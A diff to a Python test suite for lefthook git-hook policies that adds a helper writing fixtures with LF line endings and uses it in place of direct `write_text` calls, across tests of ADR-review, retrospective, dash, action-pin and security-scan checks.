@@ -69,6 +69,26 @@ def _isolate_git_config(monkeypatch: pytest.MonkeyPatch) -> None:
             monkeypatch.delenv(name, raising=False)
 
 
+def _write_lf(path: Path, content: str) -> str:
+    """Write ``content`` to ``path`` with LF endings, whatever the platform.
+
+    ``Path.write_text`` opens in text mode, so it translates ``\\n`` to the
+    platform separator and a fixture authored as LF lands as CRLF on Windows.
+    Every fixture in this module stands in for a file in this repo, and
+    ``.gitattributes`` normalises the whole repo to LF, so a CRLF fixture is
+    not a faithful stand-in. Three concrete failures on the Windows job traced
+    back to it: byte offsets computed against a re-read LF string pointed past
+    the YAML node they were meant to sit inside, and a diff between an LF base
+    commit and a CRLF working copy reported every line as changed.
+
+    Use this instead of ``path.write_text`` for any fixture. Pass
+    ``newline=`` to ``write_text`` directly only when a test needs a specific
+    non-LF separator on purpose.
+    """
+    path.write_text(content, encoding="utf-8", newline="\n")
+    return content
+
+
 def _git(
     repo: Path,
     *args: str,
@@ -95,11 +115,7 @@ def _init_repo(repo: Path, branch: str = "feature/test") -> None:
 def _commit_file(repo: Path, relative_path: str, content: str) -> str:
     path = repo / relative_path
     path.parent.mkdir(parents=True, exist_ok=True)
-    # newline="\n" because Path.write_text otherwise translates to the platform
-    # separator, so a fixture written as LF lands as CRLF on Windows and the
-    # blob no longer matches what the test asserts. .gitattributes normalizes
-    # every file in this repo to LF, so the fixtures must match.
-    path.write_text(content, encoding="utf-8", newline="\n")
+    _write_lf(path, content)
     _git(repo, "add", "--", relative_path)
     _git(repo, "commit", "-qm", f"test: add {Path(relative_path).name}")
     return _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -119,10 +135,7 @@ def _copy_runtime_config(repo: Path) -> None:
                     "uv run --frozen python",
                     f'"{PYTHON_POSIX}"',
                 )
-    (repo / "lefthook.yml").write_text(
-        yaml.safe_dump(config, sort_keys=False),
-        encoding="utf-8",
-    )
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
     for relative_path in POLICY_SUPPORT_FILES:
         source = PROJECT_ROOT / relative_path
         destination = repo / relative_path
@@ -275,7 +288,7 @@ def _write_today_session(repo: Path, content: str) -> Path:
     today = datetime.now(tz=UTC).strftime("%Y-%m-%d")
     session = repo / ".agents" / "sessions" / f"{today}-session-1.json"
     session.parent.mkdir(parents=True, exist_ok=True)
-    session.write_text(content, encoding="utf-8")
+    _write_lf(session, content)
     return session
 
 
@@ -286,7 +299,7 @@ def test_adr_review_policy_blocks_stale_debate_reference(
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
-    (analysis / "old-debate.md").write_text("ADR-042 review", encoding="utf-8")
+    _write_lf(analysis / "old-debate.md", "ADR-042 review")
 
     result = policy.check_adr_review_policy(
         [".agents/architecture/ADR-062-navigation.md"],
@@ -301,7 +314,7 @@ def test_adr_review_policy_allows_fresh_evidence_and_no_adr_change(tmp_path: Pat
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
-    (analysis / "adr-062-debate.md").write_text("ADR-062 review", encoding="utf-8")
+    _write_lf(analysis / "adr-062-debate.md", "ADR-062 review")
 
     assert (
         policy.check_adr_review_policy(
@@ -317,7 +330,7 @@ def test_adr_review_policy_matches_complete_adr_ids(tmp_path: Path) -> None:
     _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
-    (analysis / "adr-0620-debate.md").write_text("ADR-0620 review", encoding="utf-8")
+    _write_lf(analysis / "adr-0620-debate.md", "ADR-0620 review")
 
     assert (
         policy.check_adr_review_policy(
@@ -335,7 +348,7 @@ def test_adr_review_policy_rejects_symlinked_debate_evidence(tmp_path: Path) -> 
     analysis = tmp_path / ".agents" / "analysis"
     analysis.mkdir(parents=True)
     evidence = tmp_path / "evidence.md"
-    evidence.write_text("ADR-062 review", encoding="utf-8")
+    _write_lf(evidence, "ADR-062 review")
     (analysis / "adr-062-debate.md").symlink_to(evidence)
 
     assert (
@@ -434,7 +447,7 @@ def test_retrospective_policy_accepts_yesterday_retro_across_midnight(
     _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
     retro = tmp_path / ".agents" / "retrospective" / "2026-03-14-session-finish.md"
     retro.parent.mkdir(parents=True, exist_ok=True)
-    retro.write_text("# Retrospective\nreal work\n", encoding="utf-8")
+    _write_lf(retro, "# Retrospective\nreal work\n")
 
     # Two paths avoid the trivial-session bypass, isolating the yesterday grace.
     assert (
@@ -459,9 +472,7 @@ def test_retrospective_policy_accepts_yesterday_session_evidence_across_midnight
     _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
     sessions = tmp_path / ".agents" / "sessions"
     sessions.mkdir(parents=True, exist_ok=True)
-    (sessions / "2026-03-14-session-1.json").write_text(
-        '{"notes": "Learnings captured"}', encoding="utf-8"
-    )
+    _write_lf(sessions / "2026-03-14-session-1.json", '{"notes": "Learnings captured"}')
 
     # No retrospective file: the only passing path is the yesterday session log.
     assert (
@@ -486,12 +497,10 @@ def test_retrospective_policy_blocks_evidence_older_than_grace_window(
     _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
     retro = tmp_path / ".agents" / "retrospective" / "2026-03-13-x.md"
     retro.parent.mkdir(parents=True, exist_ok=True)
-    retro.write_text("# Retrospective\nstale\n", encoding="utf-8")
+    _write_lf(retro, "# Retrospective\nstale\n")
     sessions = tmp_path / ".agents" / "sessions"
     sessions.mkdir(parents=True, exist_ok=True)
-    (sessions / "2026-03-13-session-1.json").write_text(
-        '{"notes": "Learnings captured"}', encoding="utf-8"
-    )
+    _write_lf(sessions / "2026-03-13-session-1.json", '{"notes": "Learnings captured"}')
 
     # Two paths avoid the trivial-session bypass; two-days-old evidence is stale.
     assert (
@@ -839,12 +848,9 @@ def test_lefthook_skip_envs_preserve_check_only_execution(tmp_path: Path) -> Non
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p=Path('jobs.log'); old=p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + '\\n')\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + sys.argv[1] + '\\n')\n")
     jobs = [
         {
             "name": "autofix",
@@ -859,7 +865,7 @@ def test_lefthook_skip_envs_preserve_check_only_execution(tmp_path: Path) -> Non
         },
     ]
     config = {"pre-commit": {"jobs": jobs}}
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     _commit_file(repo, "tracked", "content\n")
 
     skipped_fix = _run_lefthook(
@@ -950,7 +956,7 @@ def test_lefthook_timeout_stops_hung_job(tmp_path: Path) -> None:
     # kills at ~1s, Windows (which cannot kill the child) runs the full 5s. Kept
     # short so the Windows path, which necessarily blocks for the whole sleep,
     # does not slow the suite.
-    (repo / "hang.py").write_text("import time\n\ntime.sleep(5)\n", encoding="utf-8")
+    _write_lf(repo / "hang.py", "import time\n\ntime.sleep(5)\n")
     config = {
         "pre-commit": {
             "jobs": [
@@ -962,7 +968,7 @@ def test_lefthook_timeout_stops_hung_job(tmp_path: Path) -> None:
             ]
         }
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
 
     started = time.monotonic()
     result = _run_lefthook(repo, "run", "pre-commit", "--force", check=False)
@@ -1092,17 +1098,14 @@ def test_doublestar_selects_root_level_push_file(tmp_path: Path) -> None:
     _copy_runtime_config(repo)
     detector = repo / ".claude/skills/security-detection/detect_infrastructure.py"
     detector.parent.mkdir(parents=True, exist_ok=True)
-    detector.write_text(
-        "from pathlib import Path\nimport sys\n"
-        "Path('root-job-ran.txt').write_text(','.join(sys.argv[1:]), encoding='utf-8')\n",
-        encoding="utf-8",
-    )
-    (repo / "root-only.txt").write_text("base\n", encoding="utf-8")
+    _write_lf(detector, "from pathlib import Path\nimport sys\n"
+        "Path('root-job-ran.txt').write_text(','.join(sys.argv[1:]), encoding='utf-8')\n")
+    _write_lf(repo / "root-only.txt", "base\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: base")
     base_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
     _git(repo, "update-ref", "refs/remotes/origin/main", base_sha)
-    (repo / "root-only.txt").write_text("head\n", encoding="utf-8")
+    _write_lf(repo / "root-only.txt", "head\n")
     _git(repo, "add", "root-only.txt")
     _git(repo, "commit", "-qm", "test: root-only push")
     head_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1129,14 +1132,11 @@ def test_doublestar_matches_nested_and_root_pre_commit_files(tmp_path: Path) -> 
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p = Path('jobs.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
         "entry = sys.argv[1] + ':' + ','.join(sys.argv[2:]) + '\\n'\n"
-        "p.write_text(old + entry)\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + entry)\n")
     config = {
         "glob_matcher": "doublestar",
         "pre-commit": {
@@ -1154,12 +1154,12 @@ def test_doublestar_matches_nested_and_root_pre_commit_files(tmp_path: Path) -> 
             ]
         },
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     _commit_file(repo, "base.txt", "base\n")
     for path in ("root.md", "nested/doc.md", "root.py", "nested/source.py"):
         target = repo / path
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text("content\n", encoding="utf-8", newline="\n")
+        _write_lf(target, "content\n")
         _git(repo, "add", path)
 
     _run_lefthook(repo, "run", "pre-commit", "--job", "markdown-check", "--force")
@@ -1174,13 +1174,10 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p = Path('jobs.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + '\\n')\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + sys.argv[1] + '\\n')\n")
     jobs = [
         {"name": "mypy", "run": f'"{PYTHON_POSIX}" marker.py mypy', "glob": "**/*.py"},
         {
@@ -1203,7 +1200,7 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
             "jobs": jobs,
         },
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     _git(repo, "add", "lefthook.yml", "marker.py")
     _git(repo, "commit", "-qm", "test: base")
     base = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1211,7 +1208,7 @@ def test_doublestar_matches_nested_pre_push_policy_jobs(tmp_path: Path) -> None:
     for path in ("root.py", "nested/source.py", "nested/config.yml"):
         target = repo / path
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_text("value = 1\n", encoding="utf-8", newline="\n")
+        _write_lf(target, "value = 1\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: nested files")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1231,13 +1228,10 @@ def test_piped_pre_push_stdin_group_broadcasts_to_each_job(tmp_path: Path) -> No
     repo = tmp_path / "repo"
     _init_repo(repo)
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
         "p = Path('stdin.log')\n"
         "old = p.read_text() if p.exists() else ''\n"
-        "p.write_text(old + sys.argv[1] + ':' + sys.stdin.read())\n",
-        encoding="utf-8",
-    )
+        "p.write_text(old + sys.argv[1] + ':' + sys.stdin.read())\n")
     jobs = [
         {
             "name": name,
@@ -1252,7 +1246,7 @@ def test_piped_pre_push_stdin_group_broadcasts_to_each_job(tmp_path: Path) -> No
             "jobs": [{"group": {"piped": True, "jobs": jobs}}],
         }
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     push_input = f"refs/heads/feature/test {'1' * 40} refs/heads/feature/test {'2' * 40}\n"
 
     _run_lefthook(repo, "run", "pre-push", "--force", stdin=push_input)
@@ -1276,11 +1270,8 @@ def test_native_push_files_cover_unpushed_branch_files(tmp_path: Path) -> None:
     _commit_file(repo, "one.py", "one = 1\n")
     head = _commit_file(repo, "two.yml", "two: true\n")
     marker = repo / "marker.py"
-    marker.write_text(
-        "from pathlib import Path\nimport sys\n"
-        "Path('push-files.log').write_text('\\n'.join(sys.argv[1:]))\n",
-        encoding="utf-8",
-    )
+    _write_lf(marker, "from pathlib import Path\nimport sys\n"
+        "Path('push-files.log').write_text('\\n'.join(sys.argv[1:]))\n")
     config = {
         "glob_matcher": "doublestar",
         "pre-push": {
@@ -1293,7 +1284,7 @@ def test_native_push_files_cover_unpushed_branch_files(tmp_path: Path) -> None:
             ]
         },
     }
-    (repo / "lefthook.yml").write_text(yaml.safe_dump(config), encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
     push_input = f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n"
 
     _run_lefthook(repo, "run", "pre-push", stdin=push_input)
@@ -1319,7 +1310,7 @@ def test_native_mypy_job_partitions_duplicate_basenames(tmp_path: Path) -> None:
         filename = "bar.py" if directory == "pkg_c" else "foo.py"
         path = repo / directory / filename
         path.parent.mkdir()
-        path.write_text(f"value: int = {value}\n", encoding="utf-8")
+        _write_lf(path, f"value: int = {value}\n")
     _git(repo, "add", ".")
     _git(repo, "commit", "-qm", "test: duplicate basenames")
     head_sha = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -1359,7 +1350,7 @@ def test_native_dispatch_forwards_argument_stdin_and_failures(tmp_path: Path) ->
     _git(repo, "update-ref", "refs/remotes/origin/main", base_sha)
     head_sha = _commit_file(repo, "tracked.txt", "head\n")
     message = repo / "message.txt"
-    message.write_text("fix: clean message\n", encoding="utf-8")
+    _write_lf(message, "fix: clean message\n")
 
     clean = _run_lefthook(
         repo,
@@ -1380,7 +1371,7 @@ def test_native_dispatch_forwards_argument_stdin_and_failures(tmp_path: Path) ->
         "--force",
         stdin=push_input,
     )
-    message.write_text(f"fix: bad {chr(0x2014)} message\n", encoding="utf-8")
+    _write_lf(message, f"fix: bad {chr(0x2014)} message\n")
     blocked_message = _run_lefthook(
         repo,
         "run",
@@ -1441,12 +1432,9 @@ def test_stage_fixed_restages_only_the_formatted_input(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     fixer = repo / "fixer.py"
-    fixer.write_text(
-        "from pathlib import Path\nimport sys\n"
+    _write_lf(fixer, "from pathlib import Path\nimport sys\n"
         "Path(sys.argv[1]).write_text('fixed\\n', encoding='utf-8')\n"
-        "Path('generated.txt').write_text('generated\\n', encoding='utf-8')\n",
-        encoding="utf-8",
-    )
+        "Path('generated.txt').write_text('generated\\n', encoding='utf-8')\n")
     config = {
         "pre-commit": {
             "jobs": [
@@ -1459,14 +1447,11 @@ def test_stage_fixed_restages_only_the_formatted_input(tmp_path: Path) -> None:
             ]
         }
     }
-    (repo / "lefthook.yml").write_text(
-        yaml.safe_dump(config, sort_keys=False),
-        encoding="utf-8",
-    )
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
     _commit_file(repo, "source.py", "before\n")
     _git(repo, "add", "lefthook.yml", "fixer.py")
     _git(repo, "commit", "-qm", "test: add formatter")
-    (repo / "source.py").write_text("changed\n", encoding="utf-8")
+    _write_lf(repo / "source.py", "changed\n")
     _git(repo, "add", "source.py")
 
     _run_lefthook(repo, "run", "pre-commit", "--force")
@@ -1517,12 +1502,12 @@ def _write_session_log(
     sessions.mkdir(parents=True, exist_ok=True)
     path = sessions / f"{date}-{name}.json"
     if raw is not None:
-        path.write_text(raw, encoding="utf-8")
+        _write_lf(path, raw)
     else:
         payload: dict[str, object] = {}
         if branch is not None:
             payload = {"branch": branch} if legacy else {"session": {"branch": branch}}
-        path.write_text(json.dumps(payload), encoding="utf-8")
+        _write_lf(path, json.dumps(payload))
     if mtime is not None:
         os.utime(path, (mtime, mtime))
     return path
@@ -1571,7 +1556,7 @@ def test_branch_context_exempt_during_merge(tmp_path: Path) -> None:
     assert policy.check_branch_context(repo) == 1
 
     merge_head = repo / _git(repo, "rev-parse", "--git-path", "MERGE_HEAD").stdout.strip()
-    merge_head.write_text(f"{head}\n", encoding="utf-8")
+    _write_lf(merge_head, f"{head}\n")
 
     assert policy.check_branch_context(repo) == 0
 
@@ -1900,10 +1885,10 @@ def test_branch_context_cli_propagates_exit_codes(tmp_path: Path) -> None:
 
 def test_commit_message_policy_handles_clean_dirty_and_missing(tmp_path: Path) -> None:
     message = tmp_path / "message"
-    message.write_text("fix: clean\n", encoding="utf-8")
+    _write_lf(message, "fix: clean\n")
     assert policy.check_commit_message(message) == 0
 
-    message.write_text(f"fix: bad {chr(0x2013)} range\n", encoding="utf-8")
+    _write_lf(message, f"fix: bad {chr(0x2013)} range\n")
     assert policy.check_commit_message(message) == 1
 
     message.write_bytes(b"fix: invalid byte \xff\n")
@@ -1954,9 +1939,9 @@ def test_staged_dash_policy_reads_the_index_blob(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     _commit_file(repo, "doc.md", "clean\n")
-    (repo / "doc.md").write_text(f"bad {chr(0x2014)} text\n", encoding="utf-8")
+    _write_lf(repo / "doc.md", f"bad {chr(0x2014)} text\n")
     _git(repo, "add", "doc.md")
-    (repo / "doc.md").write_text("working tree clean\n", encoding="utf-8")
+    _write_lf(repo / "doc.md", "working tree clean\n")
 
     assert policy.check_staged_dashes(["doc.md"], repo) == 1
     assert policy.check_staged_dashes([], repo) == 0
@@ -1982,8 +1967,8 @@ def test_staged_dash_policy_continues_after_clean_file(tmp_path: Path) -> None:
     _init_repo(repo)
     clean = repo / "clean.md"
     bad = repo / "bad.md"
-    clean.write_text("clean\n", encoding="utf-8")
-    bad.write_text("bad \N{EN DASH} text\n", encoding="utf-8")
+    _write_lf(clean, "clean\n")
+    _write_lf(bad, "bad \N{EN DASH} text\n")
     _git(repo, "add", "clean.md", "bad.md")
 
     assert policy.check_staged_dashes(["clean.md", "bad.md"], repo) == 1
@@ -2179,7 +2164,7 @@ def test_alternate_index_controls_staged_blob_and_generated_staging(
     alternate_index = repo / ".git/alternate-index"
     shutil.copy2(repo / ".git/index", alternate_index)
     monkeypatch.setenv("GIT_INDEX_FILE", str(alternate_index))
-    (repo / "doc.md").write_text(f"bad {chr(0x2014)} text\n", encoding="utf-8")
+    _write_lf(repo / "doc.md", f"bad {chr(0x2014)} text\n")
     _git(repo, "add", "doc.md")
     generated.unlink()
 
@@ -2198,16 +2183,13 @@ def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
     recorder = repo / "record_staged.py"
-    recorder.write_text(
-        "import os\n"
+    _write_lf(recorder, "import os\n"
         "import sys\n"
         "from pathlib import Path\n"
         "Path('observed.txt').write_text(\n"
         "    os.environ.get('GIT_INDEX_FILE', '') + '\\n' + '\\n'.join(sys.argv[1:]),\n"
         "    encoding='utf-8',\n"
-        ")\n",
-        encoding="utf-8",
-    )
+        ")\n")
     config = {
         "pre-commit": {
             "jobs": [
@@ -2219,18 +2201,15 @@ def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
             ]
         }
     }
-    (repo / "lefthook.yml").write_text(
-        yaml.safe_dump(config, sort_keys=False),
-        encoding="utf-8",
-    )
-    (repo / "default.md").write_text("base\n", encoding="utf-8")
-    (repo / "alternate.md").write_text("base\n", encoding="utf-8")
+    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
+    _write_lf(repo / "default.md", "base\n")
+    _write_lf(repo / "alternate.md", "base\n")
     _git(repo, "add", "lefthook.yml", "record_staged.py", "default.md", "alternate.md")
     _git(repo, "commit", "-qm", "test: add active-index probe")
 
     alternate_index = repo / ".git/alternate-index"
     shutil.copy2(repo / ".git/index", alternate_index)
-    (repo / "default.md").write_text("default change\n", encoding="utf-8")
+    _write_lf(repo / "default.md", "default change\n")
     _git(repo, "add", "default.md")
 
     _run_lefthook(
@@ -2242,7 +2221,7 @@ def test_lefthook_filters_use_active_git_index(tmp_path: Path) -> None:
     observed = repo / "observed.txt"
     assert not observed.exists()
 
-    (repo / "alternate.md").write_text("alternate change\n", encoding="utf-8")
+    _write_lf(repo / "alternate.md", "alternate change\n")
     process_env = os.environ.copy()
     process_env["GIT_INDEX_FILE"] = str(alternate_index)
     process_env["LEFTHOOK_BIN"] = LEFTHOOK
@@ -2280,7 +2259,7 @@ def test_staged_dash_policy_skips_vendored_paths(tmp_path: Path) -> None:
     _init_repo(repo)
     path = repo / "node_modules/pkg/README.md"
     path.parent.mkdir(parents=True)
-    path.write_text(f"vendor {chr(0x2014)} text\n", encoding="utf-8")
+    _write_lf(path, f"vendor {chr(0x2014)} text\n")
     _git(repo, "add", "-f", "node_modules/pkg/README.md")
 
     assert policy.check_staged_dashes(["node_modules/pkg/README.md"], repo) == 0
@@ -2291,13 +2270,13 @@ def test_action_pin_policy_checks_staged_content(tmp_path: Path) -> None:
     _init_repo(repo)
     workflow = repo / ".github/workflows/test.yml"
     workflow.parent.mkdir(parents=True)
-    workflow.write_text("steps:\n  - uses: actions/checkout@v4\n", encoding="utf-8")
+    _write_lf(workflow, "steps:\n  - uses: actions/checkout@v4\n")
     _git(repo, "add", ".github/workflows/test.yml")
 
     assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 1
-    workflow.write_text(
+    _write_lf(
+        workflow,
         "steps:\n  - uses: actions/checkout@1234567890123456789012345678901234567890\n",
-        encoding="utf-8",
     )
     _git(repo, "add", ".github/workflows/test.yml")
     assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 0
@@ -2310,7 +2289,7 @@ def test_action_pin_policy_allows_local_actions_and_rejects_unsafe_paths(
     _init_repo(repo)
     workflow = repo / ".github/workflows/test.yml"
     workflow.parent.mkdir(parents=True)
-    workflow.write_text("steps:\n  - uses: ./local-action\n", encoding="utf-8")
+    _write_lf(workflow, "steps:\n  - uses: ./local-action\n")
     _git(repo, "add", ".github/workflows/test.yml")
 
     assert policy.check_staged_action_pins([".github/workflows/test.yml"], repo) == 0
@@ -2323,12 +2302,12 @@ def test_security_suppression_policy_blocks_only_active_code(tmp_path: Path) -> 
     source = repo / "source.py"
     suppression_a = "# no" + "sec"
     suppression_b = "# no" + "sem" + "grep"
-    source.write_text(f"value = 1  {suppression_a}\n", encoding="utf-8")
+    _write_lf(source, f"value = 1  {suppression_a}\n")
 
     assert policy.check_security_suppressions(["source.py"], repo) == 1
-    source.write_text(f"value = 1  {suppression_b}\n", encoding="utf-8")
+    _write_lf(source, f"value = 1  {suppression_b}\n")
     assert policy.check_security_suppressions(["source.py"], repo) == 1
-    source.write_text("value = 1\n", encoding="utf-8")
+    _write_lf(source, "value = 1\n")
     assert policy.check_security_suppressions(["source.py"], repo) == 0
     assert policy.check_security_suppressions(["missing.py"], repo) == 0
 
@@ -2404,9 +2383,9 @@ def test_generated_staging_uses_the_named_allowlist(tmp_path: Path) -> None:
     _init_repo(repo)
     _commit_file(repo, ".vscode/mcp.json", '{"version": 1}\n')
     (repo / ".factory").mkdir()
-    (repo / ".vscode/mcp.json").write_text('{"version": 2}\n', encoding="utf-8")
-    (repo / ".factory/mcp.json").write_text("{}\n", encoding="utf-8")
-    (repo / "unrelated.txt").write_text("do not stage\n", encoding="utf-8")
+    _write_lf(repo / ".vscode/mcp.json", '{"version": 2}\n')
+    _write_lf(repo / ".factory/mcp.json", "{}\n")
+    _write_lf(repo / "unrelated.txt", "do not stage\n")
 
     assert policy.stage_generated("mcp", repo) == 0
 
@@ -2446,8 +2425,8 @@ def test_stage_generated_stages_only_allowlisted_tracked_deletion(
     _init_repo(repo)
     generated = repo / generated_path
     generated.parent.mkdir(parents=True, exist_ok=True)
-    generated.write_text("generated\n", encoding="utf-8")
-    (repo / unrelated_path).write_text("unrelated\n", encoding="utf-8")
+    _write_lf(generated, "generated\n")
+    _write_lf(repo / unrelated_path, "unrelated\n")
     _git(repo, "add", "--", generated_path, unrelated_path)
     _git(repo, "commit", "-qm", "test: add generated and unrelated files")
     generated.unlink()
@@ -2478,7 +2457,7 @@ def test_generated_staging_rejects_symlinked_ancestor(
 ) -> None:
     generated = tmp_path / ".vscode/mcp.json"
     generated.parent.mkdir(parents=True)
-    generated.write_text("{}\n", encoding="utf-8")
+    _write_lf(generated, "{}\n")
     original_is_symlink = Path.is_symlink
     monkeypatch.setattr(
         Path,
@@ -2499,10 +2478,10 @@ def test_episode_extraction_stages_only_reported_output(
     _init_repo(repo)
     session = ".agents/sessions/2026-07-19-session-1-test.json"
     (repo / session).parent.mkdir(parents=True)
-    (repo / session).write_text("{}\n", encoding="utf-8")
+    _write_lf(repo / session, "{}\n")
     episode = repo / ".agents/memory/episodes/episode-2026-07-19-session-1-test.json"
     episode.parent.mkdir(parents=True)
-    episode.write_text("{}\n", encoding="utf-8")
+    _write_lf(episode, "{}\n")
     original_run = policy._run_command
 
     def fake_run(
@@ -2588,11 +2567,11 @@ def test_pushed_suppression_scan_ignores_clean_worktree_override(tmp_path: Path)
     _init_repo(repo)
     base = _commit_file(repo, "nested/source.py", "value = 1\n")
     source = repo / "nested/source.py"
-    source.write_text(f"value = 1  {'# no' + 'sec'}\n", encoding="utf-8")
+    _write_lf(source, f"value = 1  {'# no' + 'sec'}\n")
     _git(repo, "add", "nested/source.py")
     _git(repo, "commit", "-qm", "test: pushed suppression")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
-    source.write_text("value = 1\n", encoding="utf-8")
+    _write_lf(source, "value = 1\n")
     stream = io.StringIO(f"refs/heads/feature/test {head} refs/heads/feature/test {base}\n")
 
     assert policy.check_pushed_suppressions(stream, repo) == 1
@@ -2634,7 +2613,7 @@ def test_pushed_suppression_scan_ignores_unchanged_legacy_suppressions(
     _commit_file(repo, "legacy.py", f"value = 1  {'# no' + 'sec'}\n")
     base = _commit_file(repo, "source.py", "value = 1\n")
     source = repo / "source.py"
-    source.write_text("value = 2\n", encoding="utf-8")
+    _write_lf(source, "value = 2\n")
     _git(repo, "add", "source.py")
     _git(repo, "commit", "-qm", "test: update clean source")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -2652,11 +2631,11 @@ def test_pushed_semgrep_scan_materializes_immutable_head(
     _commit_file(repo, "nested/source.py", "value = 1\n")
     base = _commit_file(repo, "unchanged.py", "dangerous = True\n")
     source = repo / "nested/source.py"
-    source.write_text("dangerous = True\n", encoding="utf-8")
+    _write_lf(source, "dangerous = True\n")
     _git(repo, "add", "nested/source.py")
     _git(repo, "commit", "-qm", "test: pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
-    source.write_text("dangerous = False\n", encoding="utf-8")
+    _write_lf(source, "dangerous = False\n")
 
     def fake_scan(
         tree: Path,
@@ -2681,11 +2660,8 @@ def test_pushed_semgrep_scan_reads_export_ignored_changed_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "nested/source.py", "value = 1\n")
-    (repo / "nested/source.py").write_text("dangerous = True\n", encoding="utf-8")
-    (repo / ".gitattributes").write_text(
-        "nested/source.py export-ignore\n",
-        encoding="utf-8",
-    )
+    _write_lf(repo / "nested/source.py", "dangerous = True\n")
+    _write_lf(repo / ".gitattributes", "nested/source.py export-ignore\n")
     _git(repo, "add", "nested/source.py", ".gitattributes")
     _git(repo, "commit", "-qm", "test: hide pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -2712,11 +2688,8 @@ def test_pushed_semgrep_scan_reads_unsubstituted_changed_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "source.js", "const safe = true;\n")
-    (repo / "source.js").write_text(
-        "const value = '$Format:a%eval(userInput);$';\n",
-        encoding="utf-8",
-    )
-    (repo / ".gitattributes").write_text("source.js export-subst\n", encoding="utf-8")
+    _write_lf(repo / "source.js", "const value = '$Format:a%eval(userInput);$';\n")
+    _write_lf(repo / ".gitattributes", "source.js export-subst\n")
     _git(repo, "add", "source.js", ".gitattributes")
     _git(repo, "commit", "-qm", "test: substitute pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -2743,13 +2716,13 @@ def test_pushed_semgrep_scan_ignores_local_replacement_blob(
     repo = tmp_path / "repo"
     _init_repo(repo)
     base = _commit_file(repo, "source.py", "dangerous = False\n")
-    (repo / "source.py").write_text("dangerous = True\n", encoding="utf-8")
+    _write_lf(repo / "source.py", "dangerous = True\n")
     _git(repo, "add", "source.py")
     _git(repo, "commit", "-qm", "test: pushed finding")
     head = _git(repo, "rev-parse", "HEAD").stdout.strip()
     dangerous_blob = _git(repo, "rev-parse", f"{head}:source.py").stdout.strip()
     benign = repo / "benign.py"
